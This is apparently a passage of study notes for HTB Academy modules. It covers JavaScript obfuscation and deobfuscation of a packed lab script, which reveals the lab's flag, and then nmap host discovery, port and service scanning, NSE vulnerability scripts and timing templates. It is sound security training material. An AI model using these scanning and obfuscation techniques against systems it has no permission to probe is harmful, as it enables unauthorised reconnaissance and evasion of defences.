&lt;h1&gt;Secret Serial Generator&lt;/h1&gt;\n        &lt;p&gt;This page generates secret serials!&lt;/p&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre> <p>CSS can bi external in a link or, as it is here, in-line (between \\&lt;style&gt; tags). </p> <p>On line ### we can see a link to a JavaScript file. Examining the file we get</p> <pre><code>eval(function (p, a, c, k, e, d) { e = function (c) { return c.toString(36) }; if (!''.replace(/^/, String)) { while (c--) { d[c.toString(a)] = k[c] || c.toString(a) } k = [function (e) { return d[e] }]; e = function () { return '\\\\w+' }; c = 1 }; while (c--) { if (k[c]) { p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c]) } } return p }('g 4(){0 5=\"6{7!}\";0 1=8 a();0 2=\"/9.c\";1.d(\"e\",2,f);1.b(3)}', 17, 17, 'var|xhr|url|null|generateSerial|flag|HTB|1_4m_7h3_53r14l_g3n3r470r|new|serial|XMLHttpRequest|send|php|open|POST|true|function'.split('|'), 0, {}))\n</code></pre> <p>It's obfuscated and to see what the script is really doing we need to deobfuscate it. </p>"},{"location":"htb-academy/javascript_deobfuscation/#code-obfuscation","title":"Code Obfuscation","text":""},{"location":"htb-academy/javascript_deobfuscation/#what-is-obfuscation","title":"What is obfuscation","text":"<p>Obfuscation is a technique to make code harder to read (for humans). It has to retain the same functionality. One technique used is to turn words or letters and symbols into dictionary elements and on execution a function recreates the code.</p> <p>We can try a simple dictionary obfuscation on the site http://beautifytools.com/javascript-obfuscator.php</p> <p></p> <p>And the obfuscated result:</p> <p></p>"},{"location":"htb-academy/javascript_deobfuscation/#basic-obfuscation","title":"Basic obfuscation","text":""},{"location":"htb-academy/javascript_deobfuscation/#code-minification","title":"Code Minification","text":"<p>One way to reduce readability of the code is to <code>minify</code> it. <code>Code minification</code> is the process to put the code in one single line. It's more useful for longer code. Short code is easy readable without de-minifying it.  Here is an example of a minified function in JavaScript. The tool used is https://javascript-minifier.com.</p> <p>The original function is: </p> <pre><code>function displayLog(){\nconsole.log('Displaying the log on the console';\n}\n</code></pre> <p>The minified result:</p> <pre><code>function displayLog(){console.log(\"Displaying the log on the console\")}\n</code></pre>"},{"location":"htb-academy/javascript_deobfuscation/#code-packing","title":"Code Packing","text":"<p>The next step is to pack the \"one-liner\". Using again BeautifyTools, we get:</p> <pre><code>eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('3 4(){0.1(\"5 2 1 6 2 0\")}',7,7,'console|log|the|function|displayLog|Displaying|on'.split('|'),0,{}))\n</code></pre> <p>The functionality is the same but it's a lot harder to figure out what the code does.</p> <p>Note</p> <p>The above type of obfuscation is known as \"packing\", which is  usually recognizable from the six function arguments used in the initial function \"function(p,a,c,k,e,d)\".</p> <p>The code is very hard to read, but we can still see keywords in the text. Would there be a password or username embedded, we could easily identify that.</p>"},{"location":"htb-academy/javascript_deobfuscation/#advanced-obfuscation","title":"Advanced Obfuscation","text":"<p>To get rid of the strings that are still in clear text, we need to run further obfuscation, like converting the strings to <code>base64</code>,  normal or inverted string arrays and other methods. A great tool for that is https://obfuscator.io/. We can simply add the code as we would write it and the tool takes care of minification and packing if needed.</p> <pre><code>function displayLog(){\nconsole.log('Displaying the log on the console');\n}\n</code></pre> <p>If we change the string encoding to <code>base64</code>, we get this result. </p> <pre><code>function _0x4a8c(_0x4d7d28,_0x14190e){var _0x5156cc=_0x5156();return _0x4a8c=function(_0x4a8c7c,_0x55ee43){_0x4a8c7c=_0x4a8c7c-0x1d1;var _0x298f67=_0x5156cc[_0x4a8c7c];if(_0x4a8c['MYesew']===undefined){var _0x168314=function(_0x4c126d){var _0x4de0e6='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0xf22684='',_0x156846='';for(var _0x1c0a0a=0x0,_0x542475,_0xc92795,_0x2d29f0=0x0;_0xc92795=_0x4c126d['charAt'](_0x2d29f0++);~_0xc92795&amp;&amp;(_0x542475=_0x1c0a0a%0x4?_0x542475*0x40+_0xc92795:_0xc92795,_0x1c0a0a++%0x4)?_0xf22684+=String['fromCharCode'](0xff&amp;_0x542475&gt;&gt;(-0x2*_0x1c0a0a&amp;0x6)):0x0){_0xc92795=_0x4de0e6['indexOf'](_0xc92795);}for(var _0x2802bd=0x0,_0x42a3bf=_0xf22684['length'];_0x2802bd&lt;_0x42a3bf;_0x2802bd++){_0x156846+='%'+('00'+_0xf22684['charCodeAt'](_0x2802bd)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x156846);};_0x4a8c['kvzxyW']=_0x168314,_0x4d7d28=arguments,_0x4a8c['MYesew']=!![];}var _0x5d1f35=_0x5156cc[0x0],_0xa678f9=_0x4a8c7c+_0x5d1f35,_0x2f7a0b=_0x4d7d28[_0xa678f9];return!_0x2f7a0b?(_0x298f67=_0x4a8c['kvzxyW'](_0x298f67),_0x4d7d28[_0xa678f9]=_0x298f67):_0x298f67=_0x2f7a0b,_0x298f67;},_0x4a8c(_0x4d7d28,_0x14190e);}(function(_0x9212d0,_0x22cbb0){var _0x565877=_0x4a8c,_0x530a2d=_0x9212d0();while(!![]){try{var _0x2ad480=parseInt(_0x565877('0x1d8'))/0x1+-parseInt(_0x565877('0x1d5'))/0x2+-parseInt(_0x565877('0x1dc'))/0x3*(parseInt(_0x565877('0x1d9'))/0x4)+-parseInt(_0x565877('0x1d6'))/0x5*(parseInt(_0x565877('0x1d1'))/0x6)+-parseInt(_0x565877('0x1d3'))/0x7*(-parseInt(_0x565877('0x1db'))/0x8)+parseInt(_0x565877('0x1dd'))/0x9*(-parseInt(_0x565877('0x1de'))/0xa)+parseInt(_0x565877('0x1d2'))/0xb*(parseInt(_0x565877('0x1d4'))/0xc);if(_0x2ad480===_0x22cbb0)break;else _0x530a2d['push'](_0x530a2d['shift']());}catch(_0x48e9a2){_0x530a2d['push'](_0x530a2d['shift']());}}}(_0x5156,0xc7adf));function _0x5156(){var _0x3d4343=['ndK1EgHwtLb4','mJe5mduWvwfJBgTQ','nMPvwNndsa','ody3ndzhwurRsgK','mtuYnLfosfnerq','mZy5nNDeBuvpEq','mJiZmZCZog9bC1rQqG','mZm3mdy0nufdAMXWBa','rgLZCgXHEwLUzYb0AguGBg9Nig9UihrOzsbJB25ZB2XL','mtaZntC2m3HiAM5jAG','mZyWnJyYofPLueTTqW','Bg9N','ndu4otzoEevnA0e','m1HmvxfxDW'];_0x5156=function(){return _0x3d4343;};return _0x5156();}function displayLog(){var _0x20dcfc=_0x4a8c;console[_0x20dcfc('0x1da')](_0x20dcfc('0x1d7'));}\n</code></pre> <p>We can see, a code snippet of three lines became a long function of pretty much unreadable code. That's why obfuscated code take longer (uses more resources) to run but it's running like the 3-line source code.</p> <p>We can obfuscate it even further with http://www.jsfuck.com/. </p> <p></p> <p>There are many other JavaScript obfuscators, like JJ Encode or AA Encode. They make code execution very slow and there is a point where we should stop with obfuscation unless there is a reason for it (like bypasing WAF's or restrictions)</p>"},{"location":"htb-academy/javascript_deobfuscation/#code-deobfuscation","title":"Code Deobfuscation","text":"<p>If we look again on the <code>script.js</code> from the homepage we see it's minified and packed.</p> <pre><code>eval(function (p, a, c, k, e, d) { e = function (c) { return c.toString(36) }; if (!''.replace(/^/, String)) { while (c--) { d[c.toString(a)] = k[c] || c.toString(a) } k = [function (e) { return d[e] }]; e = function () { return '\\\\w+' }; c = 1 }; while (c--) { if (k[c]) { p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c]) } } return p }('g 4(){0 5=\"6{7!}\";0 1=8 a();0 2=\"/9.c\";1.d(\"e\",2,f);1.b(3)}', 17, 17, 'var|xhr|url|null|generateSerial|flag|HTB|1_4m_7h3_53r14l_g3n3r470r|new|serial|XMLHttpRequest|send|php|open|POST|true|function'.split('|'), 0, {}))\n</code></pre> <p>We can try to un-minify with a tool like Prettier or Beautifier. But we still get an obfuscated, packed script.</p> <p>So we go directly to JSNice and paste in the minified, packed script and try to get a clear script we can understand (deactivate <code>Infer types</code> in the settings to get rid of the comments). We get</p> <pre><code>'use strict';\nfunction generateSerial() {\nvar flag = \"HTB{1_4m_7h3_53r14l_g3n3r470r!}\";\nvar xhr = new XMLHttpRequest;\nvar url = \"/serial.php\";\nxhr.open(\"POST\", url, true);\nxhr.send(null);\n}\n;\n</code></pre> <p>Now we can see that the script makes an post request to <code>serial.php</code> and we can do the same with <code>curl</code> or <code>burp</code>  and see the result. </p>"},{"location":"htb-academy/javascript_deobfuscation/#further-investigation","title":"Further investigation","text":"<p>If we try to send a <code>POST</code> request to the URL from the deobfuscated script we get:</p> <pre><code>bonzo@srv001:~&gt; curl 46.101.23.188:32013/serial.php -X POST\nN2gxNV8xNV9hX3MzY3IzN19tMzU1NGcz\n</code></pre> <p>We get some kind of encoded string and we have to decode it. Let's take a quick look at the 3 most common text encoding methods</p>"},{"location":"htb-academy/javascript_deobfuscation/#base64","title":"base64","text":"<p>base64 is usually used to represent binary data in ASCII string format. For example, it's used in mail messages that have included pictures. <code>base64</code> can also be used to convert text with special characters to an alpha-numeric characters, in addition to <code>+</code> and <code>/</code> only.</p> <p><code>base64</code> is pretty easy to identify because it's only alphanumeric characters and they often have <code>=</code> as a padding (base64 encoded strings have to be a multiple (modulo) of 4. If encoded text length modulo 4 isn't 0, the remainder is padded with <code>=</code> For example text length is 22. 22%4=2, so we would have to add 2 <code>=</code> to the end.</p>"},{"location":"htb-academy/javascript_deobfuscation/#base64-encode","title":"base64 encode","text":"<pre><code>Bonzo@htb[/htb]$ echo https://www.hackthebox.eu/ | base64\naHR0cHM6Ly93d3cuYXJpYS1uZXR3b3JrLmNvbS8K\n</code></pre>"},{"location":"htb-academy/javascript_deobfuscation/#base64-decode","title":"base64 decode","text":"<pre><code>Bonzo@htb[/htb]$ echo aHR0cHM6Ly93d3cuYXJpYS1uZXR3b3JrLmNvbS8K | base64 -d\nhttps://www.hackthebox.eu/\n</code></pre>"},{"location":"htb-academy/javascript_deobfuscation/#hex","title":"hex","text":"<p>hex encoding encodes each character as a hexadecimal representation. It can be spotted because it contains only charachters <code>a-f</code> and numbers <code>0-9</code>. </p>"},{"location":"htb-academy/javascript_deobfuscation/#hex-encode","title":"hex encode","text":"<pre><code>bonzo@srv001:~&gt; echo https://www.aria-network.com/ | xxd -p\n68747470733a2f2f7777772e617269612d6e6574776f726b2e636f6d2f0a\n</code></pre>"},{"location":"htb-academy/javascript_deobfuscation/#hex-decode","title":"hex decode","text":"<pre><code>bonzo@srv001:~&gt; echo 68747470733a2f2f7777772e617269612d6e6574776f726b2e636f6d2f0a | xxd -p -r\nhttps://www.aria-network.com/\n</code></pre>"},{"location":"htb-academy/javascript_deobfuscation/#caesarrot13","title":"Caesar/Rot13","text":"<p>rot13 is a letter substitution cipher. It shifts each character 13 times forward. <code>rot13</code> can be spotted because each character is mapped to a specific character. For example, in <code>rot13</code>, <code>http://www</code> becomes <code>uggc://jjj</code>, which still holds some resemblances and may be recognized as such.</p>"},{"location":"htb-academy/javascript_deobfuscation/#rot13-encode","title":"rot13 encode","text":"<pre><code>bonzo@srv001:~&gt; echo https://www.aria-network.com/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'\nuggcf://jjj.nevn-argjbex.pbz/\n</code></pre>"},{"location":"htb-academy/javascript_deobfuscation/#rot13-decode","title":"rot13 decode","text":"<pre><code>bonzo@srv001:~&gt; echo uggcf://jjj.nevn-argjbex.pbz/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'\nhttps://www.aria-network.com/\n</code></pre> <p>Some tools can help us automatically determine the type of encoding, like Cipher Identifier. </p> <p>Using what we know we can identify the returned string as base64 encoded.</p>"},{"location":"htb-academy/network_enumeration_with_nmap/","title":"Network Enumeration with Nmap","text":"<p>Nmap is used to discover hosts and services on a computer network  by sending packets and analyzing the responses. Nmap provides a number of features for probing computer networks,  including host discovery and service and operating system detection. Besides other features, Nmap also offers scanning capabilities that can  determine if packet filters, firewalls, or intrusion detection systems  (IDS) are configured as needed.</p>"},{"location":"htb-academy/network_enumeration_with_nmap/#host-enumeration-with-nmap","title":"Host Enumeration with Nmap","text":""},{"location":"htb-academy/network_enumeration_with_nmap/#host-discovery","title":"Host Discovery","text":"<p>The first step should be getting an overwiew over all the system that are online and that we can work with. This step may not be needed if we are given an IP to check it out. A typical host discovery scan looks like:</p> <pre><code>bonzo@srv001:/opt/share&gt; nmap 192.168.0.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5\n192.168.0.1\n192.168.0.2\n192.168.0.4\n192.168.0.5\n192.168.0.6\n192.168.0.7\n192.168.0.8\n192.168.0.9\n</code></pre> <p>The nmap options used are:</p> Option What it does 192.168.0.0/24 The network in CIDR format -sn -sn: Ping Scan - disables port scan -oA -oA \\&lt;filename&gt;: Output in the three major formats at once. Nmap has 5 output formats. The 3 major output formats are <code>normal</code>, <code>XML</code> and <code>grepable</code> tnet belongs to -oA and is the name of the files, without extension, -oA outputs (<code>tnet.nmap</code> for the normal output, <code>tnet.gnmap</code> for the grepable output and <code>tnet.xml</code> for the XML output) <p>Sometimes we get a list with predefined hosts to check. This is a simple list with an IP on each row. </p> <p>For example, if we have a list with 3 IP's:</p> <pre><code>192.168.0.1\n192.168.0.2\n192.168.0.3\n</code></pre> <p>We can use this list to scan only the hosts with that IP.</p> <pre><code>Bonzo@htb[/htb]$ sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5\n192.168.0.1\n192.168.0.2\n192.168.0.3\n</code></pre> <p>We can define more IP's on the command line.</p> <pre><code>Bonzo@htb[/htb]$ sudo nmap -sn -oA tnet 192.168.0.1 192.168.0.2 192.168.03 | grep for | cut -d\" \" -f5\n192.168.0.1\n192.168.0.2\n192.168.0.3\n</code></pre> <p>We can also define ranges of IP's</p> <pre><code>Bonzo@htb[/htb]$ sudo nmap -sn -oA tnet 192.168.0.1-3 | grep for | cut -d\" \" -f5\n192.168.0.1\n192.168.0.2\n192.168.0.3\n</code></pre>"},{"location":"htb-academy/network_enumeration_with_nmap/#single-host-scan","title":"Single Host Scan","text":"<p>If we look at a single host scan like:</p> <pre><code>srv001:/opt/share # nmap 192.168.0.100 -sn -oA host\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 00:06 CEST\nNmap scan report for kalirp (192.168.0.100)\nHost is up (0.00013s latency).\nMAC Address: DC:A6:32:38:B1:22 (Raspberry Pi Trading)\nNmap done: 1 IP address (1 host up) scanned in 0.09 seconds\n</code></pre> <p>We assume the discovery is with a <code>PING SCAN</code>. But if we add the <code>--packet-trace</code> option we can see that it was actually an <code>ARP PING</code> scan.</p> <pre><code>srv001:/opt/share # nmap 192.168.0.100 -sn -oA host -PE --packet-trace\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 00:08 CEST\nSENT (0.0478s) ARP who-has 192.168.0.100 tell 192.168.0.10\nRCVD (0.0479s) ARP reply 192.168.0.100 is-at DC:A6:32:38:B1:22\nNmap scan report for kalirp (192.168.0.100)\nHost is up (0.00012s latency).\nMAC Address: DC:A6:32:38:B1:22 (Raspberry Pi Trading)\nNmap done: 1 IP address (1 host up) scanned in 0.10 seconds\n</code></pre> <p>If we want to know why the host was classiefied as up we can use the <code>--reason</code> option</p> <pre><code>srv001:/opt/share # nmap 192.168.0.100 -sn -oA host -PE --reason\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 00:10 CEST\nNmap scan report for kalirp (192.168.0.100)\nHost is up, received arp-response (0.000097s latency).\nMAC Address: DC:A6:32:38:B1:22 (Raspberry Pi Trading)\nNmap done: 1 IP address (1 host up) scanned in 0.10 seconds\n</code></pre> <p>If we want to disable the <code>ARP PING</code> and specifically use <code>ICMP PING</code>, we can do thath with the option <code>--disable-arp-ping</code></p> <pre><code>srv001:/opt/share # nmap 192.168.0.100 -sn -oA host -PE --packet-trace --disable-arp-ping\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 00:12 CEST\nSENT (0.0675s) ICMP [192.168.0.10 &gt; 192.168.0.100 Echo request (type=8/code=0) id=62396 seq=0] IP [ttl=42 id=59438 iplen=28 ]\nRCVD (0.0676s) ICMP [192.168.0.100 &gt; 192.168.0.10 Echo reply (type=0/code=0) id=62396 seq=0] IP [ttl=64 id=58669 iplen=28 ]\nNmap scan report for kalirp (192.168.0.100)\nHost is up (0.00014s latency).\nMAC Address: DC:A6:32:38:B1:22 (Raspberry Pi Trading)\nNmap done: 1 IP address (1 host up) scanned in 0.13 seconds\n</code></pre> <p>Network scanning strategies can b e found here: https://nmap.org/book/host-discovery-strategies.html</p>"},{"location":"htb-academy/network_enumeration_with_nmap/#default-ttl-for-different-hosts","title":"Default TTL for different hosts","text":"<p>At last, we can try to figure out what OS (roughly) is running on the last scanned host only by TTL. We can se that the TTL is 64 and searching the internet for \"Default TTL OS\" we can see that it has to be a Linux system.</p> TTL OS 64 *nix (Linux/Unix) 128 Windows 256 Solaris/AIX <p>More TTL values can be found here: https://subinsb.com/default-device-ttl-values/</p>"},{"location":"htb-academy/network_enumeration_with_nmap/#host-and-port-scanning","title":"Host and Port Scanning","text":"<p>After the initial host discovery, we want to find out the services that run on the host. Therefore we scan for ports, service versions on discovered ports, maybe some information those services provide and te OS version if possible.</p>"},{"location":"htb-academy/network_enumeration_with_nmap/#port-states","title":"Port States","text":"State Description <code>open</code> This indicates that the connection to the scanned port has been established. These connections can be TCP connections, UDP datagrams as well as SCTP associations. <code>closed</code> When the port is shown as closed, the TCP protocol indicates that the packet we received back contains an <code>RST</code> flag. This scanning method can also be used to determine if our target is alive or not. <code>filtered</code> Nmap cannot correctly identify whether the scanned port is open or  closed because either no response is returned from the target for the  port or we get an error code from the target. <code>unfiltered</code> This state of a port only occurs during the TCP-ACK scan and means that the port is accessible, but it cannot be determined whether it is open or closed. <code>open|filtered</code> If we do not get a response for a specific port, <code>Nmap</code> will set it to that state. This indicates that a firewall or packet filter may protect the port. <code>closed|filtered</code> This state only occurs in the IP ID idle scans and indicates that it was impossible to determine if the scanned port is closed or filtered by a firewall."},{"location":"htb-academy/network_enumeration_with_nmap/#tcp-port-discovery","title":"TCP Port Discovery","text":"<p>By default, <code>Nmap</code> scans the top 1000 TCP ports with the <code>SYN scan</code> (-sS). The <code>SYN</code> scan is set to default if we run nmap as a privileged uses (<code>root</code>). Otherwise a <code>TCP Scan</code> (-sT) is performed as default. </p> <p>There are different options to define the ports to scan</p> Ports Description -p- Scan all ports (65535 ports, a 16 bit unsigned number) -p 53 Scan port 53 -p 53,80,443 Scan ports 53, 80 ,443 -p 53-100 Scan port range from port 53 up to port 100 --top-ports=10 Scan the top 10 ports. Top ports is nmaps own list of ports that are usually open. The maker of nmap scanned he scanned most of the Internet and determined which ports are usually open, and he built lists of the top ports for use within <code>nmap</code>. https://danielmiessler.com/blog/nmap-use-the-top-ports-option-for-both-tcp-and-udp-simultaneously/. --top-ports usually scans only <code>TCP</code> ports. To scan <code>UDP</code> as well, use <code>nmap -sTU --top-ports</code>. An basic scan would be <code>nmap -vv -O -P0 -sTUV \u2013top-ports 1000 -oA target $target</code> -F Fast port scan (top 100 ports)"},{"location":"htb-academy/network_enumeration_with_nmap/#port-states-deep-dive","title":"Port States Deep-Dive","text":"<pre><code>srv001:/opt/share # nmap 10.129.222.195 --top-ports=10 \nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 11:23 CEST\nNmap scan report for 10.129.222.195\nHost is up (0.038s latency).\n\nPORT     STATE    SERVICE\n21/tcp   closed   ftp\n22/tcp   open     ssh\n23/tcp   closed   telnet\n25/tcp   open     smtp\n80/tcp   open     http\n110/tcp  open     pop3\n139/tcp  filtered netbios-ssn\n443/tcp  closed   https\n445/tcp  filtered microsoft-ds\n3389/tcp closed   ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 0.22 seconds\n</code></pre> <p>Let's take a look why some states are closes or filtered. Let's take port 21/ftp. Also, let's clear some things for a better view. We are going to use <code>--packet-trace</code>, disable <code>TCP ping</code> and <code>ARP ping</code> (<code>-Pn</code> and <code>--disable-arp-ping</code>) and disable DNS resolution <code>-n</code></p> <pre><code>srv001:/opt/share # nmap 10.129.37.146 -p 21 --packet-trace -Pn -n --disable-arp-ping --reason\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 12:24 CEST\nSENT (0.0759s) TCP 10.10.15.152:47521 &gt; 10.129.37.146:21 S ttl=40 id=32078 iplen=44  seq=1160986713 win=1024 &lt;mss 1460&gt;\nRCVD (0.1159s) TCP 10.129.37.146:21 &gt; 10.10.15.152:47521 RA ttl=63 id=59050 iplen=40  seq=0 win=0 \nNmap scan report for 10.129.37.146\nHost is up, received user-set (0.040s latency).\n\nPORT   STATE  SERVICE REASON\n21/tcp closed ftp     reset ttl 63\n\nNmap done: 1 IP address (1 host up) scanned in 0.18 seconds\n</code></pre> <p>As we can see, a <code>SYN</code> request is sent and the server answers with <code>ACK, RST</code>. That means, for some reason, the service does not want to accept the packet. It acknowledges the packet but it drops it with a reset. </p> <p>Let's check the port 139, a filtered port</p> <pre><code>srv001:/opt/share # nmap 10.129.37.146 -p 139 --packet-trace -Pn -n --disable-arp-ping --reason\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 12:36 CEST\nSENT (0.0620s) TCP 10.10.15.152:36362 &gt; 10.129.37.146:139 S ttl=41 id=57032 iplen=44  seq=2129173419 win=1024 &lt;mss 1460&gt;\nRCVD (1.1010s) TCP 10.129.37.146:139 &gt; 10.10.15.152:36362 S ttl=63 id=0 iplen=44  seq=229234553 win=29200 &lt;mss 1357&gt;\nNmap scan report for 10.129.37.146\nHost is up, received user-set (0.039s latency).\n\nPORT    STATE SERVICE     REASON\n139/tcp filtered  netbios-ssn syn ttl 63\n\nNmap done: 1 IP address (1 host up) scanned in 0.14 seconds\n</code></pre> <p>We can see that 2 packets were sent. The first one took only 0.06 s but the second one took a whole second. That speaks for a dropped packet. If the time were similar and the server returns a failed ICMP response (type 3, code 3), the firewall is rejecting the packet. If we know for sure the host is up, that means this port is somehow accesible and we need to investigate it further. </p>"},{"location":"htb-academy/network_enumeration_with_nmap/#udp-port-discovery","title":"UDP Port Discovery","text":"<p>Since <code>UDP</code> is a stateless protocol, we don't get any acknowledgment. Therefore <code>UDP</code> scans take a lot longer than <code>TCP</code> scans. A typical <code>UDP</code> scan looks like this (we use <code>-F</code> for the top 100 ports): </p> <pre><code>srv001:/opt/share # nmap 10.129.37.146 -sU -F\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 13:00 CEST\nNmap scan report for 10.129.37.146\nHost is up (0.039s latency).\nNot shown: 97 closed udp ports (port-unreach)\nPORT    STATE         SERVICE\n68/udp  open|filtered dhcpc\n137/udp open          netbios-ns\n138/udp open|filtered netbios-dgm\n\nNmap done: 1 IP address (1 host up) scanned in 112.46 seconds\n</code></pre>"},{"location":"htb-academy/network_enumeration_with_nmap/#xml-output-to-html","title":"XML Output to HTML","text":"<p>XML output can be easily converted to HTML wit the tool <code>xsltproc</code></p> <pre><code>Bonzo@htb[/htb]$ xsltproc target.xml -o target.html\n</code></pre> <p>More about output formats: https://nmap.org/book/output.html</p>"},{"location":"htb-academy/network_enumeration_with_nmap/#service-enumeration","title":"Service Enumeration","text":"<p>After we discover all ports, it is important to find out as much as possible about this ports. It is essential to determine the application and version. With an exact version we can search for publicly available exploits or weaknesses.</p>"},{"location":"htb-academy/network_enumeration_with_nmap/#service-version-detection","title":"Service Version Detection","text":"<p>We add the <code>-sV</code> option to scan for applications and their versions.</p> <pre><code>srv001:/opt/share # nmap 10.129.239.85 -p- -sV\nStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 17:25 CEST\nNmap scan report for 10.129.239.85\nHost is up (0.037s latency).\nNot shown: 65528 closed tcp ports (reset)\nPORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))\n110/tcp   open  pop3        Dovecot pop3d\n139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n143/tcp   open  imap        Dovecot imapd\n445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n31337/tcp open  Elite?\nService Info: Host: NIX-NMAP-DEFAULT; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 174.06 seconds\n</code></pre> <p>Scans can take a long time. We can press Space to let nmap show us the current status or we can use the parameter <code>--stats-every=5s</code>. The time can be set as you wish, in seconds <code>s</code> or minutes <code>s</code>.  We can use the <code>-v</code> or <code>-vv</code> option to get the scan be more verbose and to show us detected ports as they are discovered. Sometimes <code>nmap</code> misses the version and we can try to get it manually via <code>nc</code></p> <pre><code>srv001:/opt/share # nc -nv 10.129.239.85 22\nConnection to 10.129.239.85 22 port [tcp/*] succeeded!\nSSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10\n</code></pre> <p>Note</p> <p>Give <code>nc</code> some time to finish the screen grabbing, it can tak a while to get a result</p>"},{"location":"htb-academy/network_enumeration_with_nmap/#nmap-scripting-engine-nse","title":"Nmap Scripting Engine (NSE)","text":"<p><code>NSE</code> allows users to write (and share) simple scripts (using the Lua programming language) to automate a wide variety of networking tasks.</p> <p>There are 14 categories in wich the scripts are divided.</p> Category Description <code>auth</code> Determination of authentication credentials. <code>broadcast</code> Scripts, which are used for host discovery by broadcasting and the  discovered hosts, can be automatically added to the remaining scans. <code>brute</code> Executes scripts that try to log in to the respective service by brute-forcing with credentials. <code>default</code> Default scripts executed by using the <code>-sC</code> option. <code>discovery</code> Evaluation of accessible services. <code>dos</code> These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services. <code>exploit</code> This category of scripts tries to exploit known vulnerabilities for the scanned port. <code>external</code> Scripts that use external services for further processing. <code>fuzzer</code> This uses scripts to identify vulnerabilities and unexpected packet  handling by sending different fields, which can take much time. <code>intrusive</code> Intrusive scripts that could negatively affect the target system. <code>malware</code> Checks if some malware infects the target system. <code>safe</code> Defensive scripts that do not perform intrusive and destructive access. <code>version</code> Extension for service detection. <code>vuln</code> Identification of specific vulnerabilities. <p>The <code>default</code> category is executed bey default using the <code>-sC</code> option. </p> <p>You can specify script categories or specific scripts with <code>--script &lt;category&gt;</code> or <code>--script &lt;scrip&gt;,&lt;script&gt;,...</code> You can scan for vulnerabilities with the category <code>vuln</code> .</p> <pre><code>Bonzo@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -sV --script vuln Nmap scan report for 10.129.2.28\nHost is up (0.036s latency).\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-enum:\n|   /wp-login.php: Possible admin folder\n|   /readme.html: Wordpress version: 2\n|   /: WordPress version: 5.3.4\n|   /wp-includes/images/rss.png: Wordpress version 2.2 found.\n|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.\n|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.\n|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.\n|   /wp-login.php: Wordpress login page.\n|   /wp-admin/upgrade.php: Wordpress login page.\n|_  /readme.html: Interesting, a readme.\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.\n| http-wordpress-users:\n| Username found: admin\n|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'\n| vulners:\n|   cpe:/a:apache:http_server:2.4.29:\n|       CVE-2019-0211   7.2 https://vulners.com/cve/CVE-2019-0211\n|       CVE-2018-1312   6.8 https://vulners.com/cve/CVE-2018-1312\n|       CVE-2017-15715  6.8 https://vulners.com/cve/CVE-2017-15715\n&lt;SNIP&gt;\n</code></pre>"},{"location":"htb-academy/network_enumeration_with_nmap/#performance","title":"Performance","text":"<p>Scanning performance plays a significant role when we need to scan an  extensive network or are dealing with low network bandwidth. We can use  various options to tell <code>Nmap</code> how fast (<code>-T &lt;1-5&gt;</code>), with which frequency (<code>--min-parallelism &lt;number&gt;</code>), which timeouts (<code>--max-rtt-timeout &lt;time&gt;</code>) the test packets should have, how many packets should be sent simultaneously (<code>--min-rate &lt;number&gt;</code>), and with the number of retries (<code>--max-retries &lt;number&gt;</code>) for the scanned ports the targets should be scanned.</p> <p>To make things easier, we can use templates with predifined options. We use the templated with <code>-T &lt;number&gt;</code>. Here are the options used for each template. By default, all nmap scans run on <code>\u2013T3</code> timing template. </p> T0 T1 T2 T3 T4 T5 Name Paranoid Sneaky Polite Normal Aggressive Insane <code>min-rtt-timeout</code> 100 100 100 100 100 50 <code>max-rtt-timeout</code> 300,000 15,000 10,000 10,000 1,250 300 <code>initial-rtt-timeout</code> 300,000 15,000 1,000 1,000 500 250 <code>max-retries</code> 10 10 10 10 6 2 Initial (and minimum) scan delay (<code>--scan-delay</code>) 300,000 15,000 400 0 0 0 Maximum TCP scan delay 300,000 15,000 1,000 1,000 10 5 Maximum UDP scan delay 300,000 15,000 1,000 1,000 1,000 1,000 <code>host-timeout</code> 0 0 0 0 0 900,000 <code>min-parallelism</code> Dynamic, not affected by timing templates <code>max-parallelism</code> 1 1 1 Dynamic Dynamic Dynamic <code>min-hostgroup</code> Dynamic, not affected by timing templates 